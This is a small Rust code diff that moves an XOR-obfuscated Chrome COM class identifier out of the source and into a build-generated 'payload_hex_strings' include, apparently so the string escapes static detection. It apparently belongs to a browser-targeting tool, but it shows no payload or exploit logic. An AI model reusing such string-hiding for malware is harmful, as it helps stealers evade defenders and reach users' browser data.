@@ -4,7 +4,11 @@
 use std::ffi::c_void;
 use crate::xor::decode as obf_decode;
 
-const CHROME_RECOVERY_CLSID: &str = "19120815171f05081f19150c1f080305191609131e";
+mod payload_hex_strings {
+    include!(concat!(env!("OUT_DIR"), "/payload_hex_strings.rs"));
+}
+
+use payload_hex_strings::CHROME_CLSID_ENV as CHROME_RECOVERY_CLSID;
 
 #[repr(C)]
 #[derive(Clone, Copy, Debug)]
